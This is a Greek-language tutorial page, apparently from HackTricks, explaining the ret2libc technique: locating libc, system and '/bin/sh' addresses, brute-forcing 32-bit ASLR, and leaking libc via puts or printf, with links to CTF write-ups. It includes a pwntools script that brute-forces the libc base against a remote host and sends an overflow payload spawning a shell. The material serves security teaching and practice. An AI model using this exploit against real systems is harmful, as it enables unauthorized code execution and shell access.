# Ret2lib

{{#include ../../../../banners/hacktricks-training.md}}

## **Βασικές Πληροφορίες**

Η ουσία του **Ret2Libc** είναι να ανακατευθύνει τη ροή εκτέλεσης ενός ευάλωτου προγράμματος σε μια συνάρτηση εντός μιας κοινής βιβλιοθήκης (π.χ., **system**, **execve**, **strcpy**) αντί να εκτελεί τον κώδικα που παρέχεται από τον επιτιθέμενο στο στοίβασμα. Ο επιτιθέμενος δημιουργεί ένα payload που τροποποιεί τη διεύθυνση επιστροφής στο στοίβασμα ώστε να δείχνει στη συνάρτηση της βιβλιοθήκης που επιθυμεί, ενώ ταυτόχρονα φροντίζει ώστε οποιαδήποτε απαραίτητα επιχειρήματα να είναι σωστά ρυθμισμένα σύμφωνα με τη σύμβαση κλήσης.

### **Παράδειγμα Βημάτων (απλοποιημένο)**

- Πάρτε τη διεύθυνση της συνάρτησης που θα καλέσετε (π.χ. system) και την εντολή που θα καλέσετε (π.χ. /bin/sh)
- Δημιουργήστε μια αλυσίδα ROP για να περάσετε το πρώτο επιχείρημα που δείχνει στη συμβολοσειρά εντολής και τη ροή εκτέλεσης στη συνάρτηση

## Εύρεση των διευθύνσεων

- Υποθέτοντας ότι η `libc` που χρησιμοποιείται είναι αυτή της τρέχουσας μηχανής, μπορείτε να βρείτε πού θα φορτωθεί στη μνήμη με:
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
Αν θέλεις να ελέγξεις αν το ASLR αλλάζει τη διεύθυνση της libc μπορείς να κάνεις:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
- Γνωρίζοντας τη libc που χρησιμοποιείται, είναι επίσης δυνατό να βρείτε την απόσταση στη συνάρτηση `system` με:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
- Γνωρίζοντας τη libc που χρησιμοποιείται, είναι επίσης δυνατό να βρείτε την απόσταση προς τη συνάρτηση της συμβολοσειράς `/bin/sh` με:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Χρησιμοποιώντας gdb-peda / GEF

Γνωρίζοντας τη libc που χρησιμοποιείται, είναι επίσης δυνατό να χρησιμοποιήσετε το Peda ή το GEF για να αποκτήσετε τη διεύθυνση της συνάρτησης **system**, της συνάρτησης **exit** και της συμβολοσειράς **`/bin/sh`** :
```
p system
p exit
find "/bin/sh"
```
### Χρησιμοποιώντας /proc/\<PID>/maps

Αν η διαδικασία δημιουργεί **παιδιά** κάθε φορά που μιλάτε μαζί της (διακομιστής δικτύου) προσπαθήστε να **διαβάσετε** αυτό το αρχείο (πιθανώς θα χρειαστεί να είστε root).

Εδώ μπορείτε να βρείτε **ακριβώς πού είναι φορτωμένη η libc** μέσα στη διαδικασία και **πού θα φορτωθεί** για κάθε παιδί της διαδικασίας.

![](<../../../../images/image (95).png>)

Σε αυτή την περίπτωση είναι φορτωμένη στο **0xb75dc000** (Αυτή θα είναι η βασική διεύθυνση της libc)

## Άγνωστη libc

Είναι πιθανό να **μην γνωρίζετε ποια libc φορτώνει το δυαδικό αρχείο** (γιατί μπορεί να βρίσκεται σε έναν διακομιστή όπου δεν έχετε πρόσβαση). Σε αυτή την περίπτωση μπορείτε να εκμεταλλευτείτε την ευπάθεια για να **διαρρεύσετε κάποιες διευθύνσεις και να βρείτε ποια βιβλιοθήκη libc** χρησιμοποιείται:

{{#ref}}
rop-leaking-libc-address/
{{#endref}}

Και μπορείτε να βρείτε ένα πρότυπο pwntools γι' αυτό εδώ:

{{#ref}}
rop-leaking-libc-address/rop-leaking-libc-template.md
{{#endref}}

## Παράκαμψη ASLR σε 32 bit

Αυτές οι επιθέσεις brute-forcing είναι **μόνο χρήσιμες για συστήματα 32bit**.

- Αν η εκμετάλλευση είναι τοπική, μπορείτε να προσπαθήσετε να κάνετε brute-force τη βασική διεύθυνση της libc (χρήσιμο για συστήματα 32bit):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- Αν επιτίθεστε σε έναν απομακρυσμένο διακομιστή, μπορείτε να προσπαθήσετε να **burte-force τη διεύθυνση της συνάρτησης `libc` `usleep`**, περνώντας ως επιχείρημα 10 (για παράδειγμα). Αν σε κάποιο σημείο ο **διακομιστής χρειαστεί 10 δευτερόλεπτα επιπλέον για να απαντήσει**, βρήκατε τη διεύθυνση αυτής της συνάρτησης.

## One Gadget

{{#ref}}
../../one-gadget.md
{{#endref}}

## x86 Ret2lib Code Example

Σε αυτό το παράδειγμα, το ASLR brute-force είναι ενσωματωμένο στον κώδικα και το ευάλωτο δυαδικό αρχείο βρίσκεται σε έναν απομακρυσμένο διακομιστή:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Code Example

Δείτε το παράδειγμα από:

{{#ref}}
../rop-return-oriented-programing.md
{{#endref}}

## Ret-into-printf (ή puts)

Αυτό επιτρέπει να **διαρρεύσει πληροφορίες από τη διαδικασία** καλώντας `printf`/`puts` με κάποια συγκεκριμένα δεδομένα τοποθετημένα ως επιχείρημα.

## Ret2printf

Αυτό σημαίνει βασικά την κατάχρηση ενός **Ret2lib για να το μετατρέψει σε μια ευπάθεια μορφοποίησης συμβολοσειρών `printf`** χρησιμοποιώντας το `ret2lib` για να καλέσει το printf με τις τιμές για να το εκμεταλλευτεί (ακούγεται άχρηστο αλλά είναι δυνατό):

{{#ref}}
../../format-strings/
{{#endref}}

## Άλλα παραδείγματα & αναφορές

- [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)
- Ret2lib, δεδομένης μιας διαρροής στη διεύθυνση μιας συνάρτησης στη libc, χρησιμοποιώντας ένα gadget
- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR ενεργοποιημένο αλλά χωρίς PIE, το πρώτο βήμα είναι να γεμίσετε μια υπερχείλιση μέχρι το byte 0x00 του canary για να καλέσετε στη συνέχεια το puts και να το διαρρεύσετε. Με το canary δημιουργείται ένα ROP gadget για να καλέσει το puts για να διαρρεύσει τη διεύθυνση του puts από το GOT και ένα ROP gadget για να καλέσει το `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR ενεργοποιημένο, χωρίς canary, υπερχείλιση στο stack από μια παιδική συνάρτηση. ROP gadget για να καλέσει το puts για να διαρρεύσει τη διεύθυνση του puts από το GOT και στη συνέχεια να καλέσει ένα gadget.
- [https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html)
- 64 bits, χωρίς pie, χωρίς canary, χωρίς relro, nx. Χρησιμοποιεί τη συνάρτηση write για να διαρρεύσει τη διεύθυνση της write (libc) και καλεί ένα gadget.

{{#include ../../../../banners/hacktricks-training.md}}
